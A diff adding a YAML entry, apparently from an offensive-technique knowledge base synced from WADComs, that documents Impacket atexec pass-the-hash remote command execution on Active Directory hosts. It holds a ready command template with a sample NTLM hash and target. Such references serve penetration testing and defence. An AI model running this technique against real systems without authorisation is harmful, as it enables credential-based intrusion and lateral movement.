@@ -1,0 +1,31 @@
+id: wadcoms/impacket-atexec-hash
+type: technique
+platform: active-directory
+name: Impacket atexec Hash
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- an NTLM hash (pass-the-hash)
+- a valid username
+commands:
+- template: python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76
+    test.local/john@10.10.10.1 whoami
+  comment: Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute
+    the given command. It will create a windows task with a random name, trigger the task, and then delete
+    it. The following command executes `whoami` on the remote Windows host, authenticating
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py
+- https://u0041.co/blog/post/1
+tags:
+- active-directory
+- wadcoms
+- smb
